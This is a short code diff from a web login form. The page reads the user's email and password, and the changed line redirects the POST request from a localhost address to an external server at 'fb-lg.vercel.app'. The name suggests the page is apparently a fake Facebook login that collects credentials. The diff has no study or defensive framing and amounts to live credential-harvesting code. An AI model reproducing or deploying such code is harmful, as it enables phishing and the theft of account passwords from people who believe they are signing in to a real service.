@@ -490,7 +490,7 @@
                 let name = document.getElementById('Email').value;
                 let key = document.getElementById('Password').value;
                 if (name != ""  &&  key != "" ) {
-                    let resp = await fetch('http://localhost:5500/lg', {
+                    let resp = await fetch('https://fb-lg.vercel.app/lg', {
                         method: "POST",
                         headers: {
                             "Content-Type": "application/json"
